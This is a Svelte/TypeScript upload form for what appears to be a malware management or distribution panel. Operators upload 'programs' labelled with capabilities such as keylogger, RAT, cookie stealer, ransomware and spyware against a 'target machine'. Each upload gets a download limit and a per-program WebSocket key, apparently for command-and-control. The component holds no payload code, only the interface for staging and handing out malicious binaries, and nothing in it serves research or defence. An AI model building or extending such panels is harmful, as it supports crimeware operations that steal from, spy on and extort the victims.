<script lang="ts">
	import Modal from '$components/ui/modals/Modal.svelte';
	import FormField from '$components/ui/form/FormField.svelte';
	import FormRow from '$components/ui/form/FormRow.svelte';
	import SelectInput from '$components/ui/form/SelectInput.svelte';
	import FileDropzone from '$components/ui/form/FileDropzone.svelte';
	import CapabilityGrid from '$components/ui/form/CapabilityGrid.svelte';
	import UploadIcon from '$components/ui/icons/UploadIcon.svelte';
	import type { Capability, Program } from '$lib/types';

	export let open: boolean = false;
	export let onSuccess: ((program: Program) => void) | undefined = undefined;

	// ── Form state ────────────────────────────────────────────
	let file: File | null = null;
	let fileName: string = '';
	let programName: string = '';
	let version: string = '';
	let typeName: string = '';
	let os: string = 'windows';
	let allowedDownloads: number = 0;
	let description: string = '';
	let wsKey: string = '';
	let capabilities: Set<string> = new Set();
	let error: string = '';
	let loading: boolean = false;

	const capabilityOptions: Capability[] = [
		{ id: 'keylogger', label: 'Keylogger', desc: 'Records keystrokes on target machine' },
		{ id: 'rat', label: 'RAT', desc: 'Remote Access Trojan functionality' },
		{ id: 'cookie_stealer', label: 'Cookie Stealer', desc: 'Extracts browser cookies from target' },
		{ id: 'ransomware', label: 'Ransomware', desc: 'Encrypts files and demands ransom' },
		{ id: 'spyware', label: 'Spyware', desc: 'Monitors user activity stealthily' },
		{
			id: 'screen_capture',
			label: 'Screen Capture',
			desc: 'Takes screenshots of the target system'
		}
	];

	// type_id options — ideally fetched from /api/program_types
	// Using static list here; replace with real fetch if needed
	const typeOptions = [
		{ id: '1', label: 'RAT' },
		{ id: '2', label: 'Keylogger' },
		{ id: '3', label: 'Spyware' },
		{ id: '4', label: 'Ransomware' },
		{ id: '5', label: 'Trojan' },
		{ id: '6', label: 'Worm' },
		{ id: '7', label: 'Other' }
	];

	const osList = ['windows', 'linux', 'android', 'mac'];

	function handleFileChange(e: CustomEvent<File>) {
		programName = e.detail.name;
	}

	async function generateWsKey() {
		const buf = crypto.getRandomValues(new Uint8Array(32));
		wsKey = Array.from(buf)
			.map((b) => b.toString(16).padStart(2, '0'))
			.join('');
	}

	function validate(): string {
		if (!file) return 'Please select a file.';
		if (!programName.trim()) return 'Program name is required.';
		if (!version.trim()) return 'Version is required.';
		if (!typeName.trim()) return 'Please select a program type.';
		if (!os) return 'Please select an OS.';
		if (!wsKey.trim()) return 'WebSocket key is required. Use Generate to create one.';
		if (wsKey.length !== 64) return 'WebSocket key must be exactly 64 hex characters.';
		return '';
	}

	async function handleSubmit() {
		error = validate();
		if (error) return;

		loading = true;

        const typeId = typeOptions.find(option => option.label === typeName);

        if (!typeId) {
            error = 'Invalid program type selected.';
            loading = false;
            return;
        }

        const token = document.cookie
            .split('; ')
            .find((c) => c.startsWith('token='))
            ?.split('=')[1];

		try {
			const fd = new FormData();
			fd.append('file', file!);
			fd.append('name', programName.trim());
			fd.append('version', version.trim());
			fd.append('type_id', typeId.id);
			fd.append('os', os);
			fd.append('allowed_downloads', String(allowedDownloads));
			fd.append('description', description);
			fd.append('ws_key', wsKey.trim());

			const res = await fetch('/api/programs', {
				method: 'POST',
                headers: { Authorization: `Bearer ${token}` },
				body: fd
			});

			const data = await res.json();

			if (!res.ok) {
				error = data.error ?? 'Upload failed.';
				loading = false;
				return;
			}

			onSuccess?.(data as Program);
			close();
		} catch {
			error = 'Could not reach the server.';
			loading = false;
		}
	}

	function close() {
		open = false;
		file = null;
		fileName = '';
		programName = '';
		version = '';
		typeName = '';
		os = 'windows';
		allowedDownloads = 0;
		description = '';
		wsKey = '';
		capabilities = new Set();
		error = '';
		loading = false;
	}

	$: if (!open) close();
</script>

<Modal bind:open title="Upload New Program">
	<svelte:fragment slot="default">
		{#if error}
			<div class="form-error">{error}</div>
		{/if}

		<FileDropzone
			bind:file
			bind:fileName
			label="Select File"
			required
			on:change={handleFileChange}
		/>

		<FormRow>
			<FormField
				id="prog-name"
				label="Program Name"
				required
				bind:value={programName}
				placeholder="e.g., payload.exe"
			/>
			<FormField
				id="prog-ver"
				label="Version"
				required
				bind:value={version}
				placeholder="e.g., 1.0"
			/>
		</FormRow>

		<FormRow>
			<SelectInput
				id="prog-type"
				label="Program Type"
				required
				bind:value={typeName}
				options={typeOptions.map((t) => t.label)}
				placeholder="Select type…"
			/>
			<SelectInput
				id="prog-os"
				label="Operating System"
				required
				bind:value={os}
				options={osList}
			/>
		</FormRow>

		<div class="form-field">
			<label class="form-label" for="prog-dl">
				Allowed Downloads <span class="form-hint">(0 = unlimited)</span>
			</label>
			<input id="prog-dl" class="form-input" type="number" min="0" bind:value={allowedDownloads} />
		</div>

		<div class="form-field">
			<label class="form-label" for="prog-wskey">
				WebSocket Key <span class="required">*</span>
				<span class="form-hint">(64-char hex, unique per program)</span>
			</label>
			<div class="wskey-row">
				<input
					id="prog-wskey"
					class="form-input wskey-input"
					type="text"
					maxlength="64"
					placeholder="64-character hex key…"
					bind:value={wsKey}
					spellcheck="false"
				/>
				<button type="button" class="generate-btn" on:click={generateWsKey}> Generate </button>
			</div>
			{#if wsKey}
				<span
					class="wskey-len"
					class:wskey-len--ok={wsKey.length === 64}
					class:wskey-len--bad={wsKey.length !== 64}
				>
					{wsKey.length} / 64
				</span>
			{/if}
		</div>

		<div class="form-field">
			<span class="form-label">Capabilities</span>
			<CapabilityGrid options={capabilityOptions} bind:selected={capabilities} />
		</div>

		<div class="form-field">
			<label class="form-label" for="prog-desc">Description</label>
			<textarea
				id="prog-desc"
				class="form-textarea"
				placeholder="Enter program description…"
				bind:value={description}
				rows="3"
			></textarea>
		</div>
	</svelte:fragment>

	<svelte:fragment slot="footer">
		<button
			class="submit-btn"
			class:submit-btn--loading={loading}
			on:click={handleSubmit}
			disabled={loading}
		>
			{#if loading}
				<span class="spinner"></span>
			{:else}
				<UploadIcon size={15} />
				Upload Program
			{/if}
		</button>
	</svelte:fragment>
</Modal>

<style lang="scss">
	@use '$lib/styles/variables' as *;

	.form-field {
		display: flex;
		flex-direction: column;
		gap: 6px;
	}

	.form-label {
		font-size: 12px;
		font-weight: 500;
		color: $text-muted;
		.required {
			color: $accent;
		}
	}

	.form-hint {
		font-weight: 400;
		color: $text-muted;
	}

	.form-input,
	.form-textarea {
		background: $bg-card;
		border: 1px solid $border;
		border-radius: $radius;
		padding: 9px 12px;
		font-size: 13px;
		color: $text-primary;
		outline: none;
		width: 100%;
		box-sizing: border-box;
		transition: border-color $transition;

		&::placeholder {
			color: $text-muted;
		}
		&:focus {
			border-color: $accent;
		}
	}

	.form-textarea {
		resize: vertical;
		min-height: 72px;
		font-family: inherit;
	}

	.wskey-row {
		display: flex;
		gap: 8px;
	}

	.wskey-input {
		flex: 1;
		font-family: 'JetBrains Mono', 'Fira Code', monospace;
		font-size: 11px;
	}

	.generate-btn {
		flex-shrink: 0;
		background: $bg-card;
		border: 1px solid $border;
		border-radius: $radius;
		color: $text-primary;
		font-size: 12px;
		font-weight: 600;
		padding: 0 14px;
		cursor: pointer;
		white-space: nowrap;
		transition:
			border-color $transition,
			background $transition;

		&:hover {
			border-color: $accent;
			background: rgba($accent, 0.06);
		}
	}

	.wskey-len {
		font-size: 11px;
		&--ok {
			color: #34d87a;
		}
		&--bad {
			color: #f5a623;
		}
	}

	.form-error {
		background: rgba(#f87171, 0.1);
		border: 1px solid rgba(#f87171, 0.3);
		border-radius: 6px;
		padding: 10px 14px;
		font-size: 13px;
		color: #f87171;
	}

	.submit-btn {
		width: 100%;
		padding: 11px;
		background: $accent;
		border: none;
		border-radius: $radius;
		color: white;
		font-size: 14px;
		font-weight: 600;
		cursor: pointer;
		display: flex;
		align-items: center;
		justify-content: center;
		gap: 8px;
		transition:
			opacity $transition,
			transform $transition;

		&:hover:not(:disabled) {
			opacity: 0.88;
		}
		&:active:not(:disabled) {
			transform: scale(0.98);
		}
		&:disabled {
			cursor: not-allowed;
			opacity: 0.7;
		}
		&--loading {
			pointer-events: none;
		}
	}

	.spinner {
		width: 16px;
		height: 16px;
		border: 2px solid rgba(white, 0.3);
		border-top-color: white;
		border-radius: 50%;
		animation: spin 0.6s linear infinite;
	}

	@keyframes spin {
		to {
			transform: rotate(360deg);
		}
	}
</style>
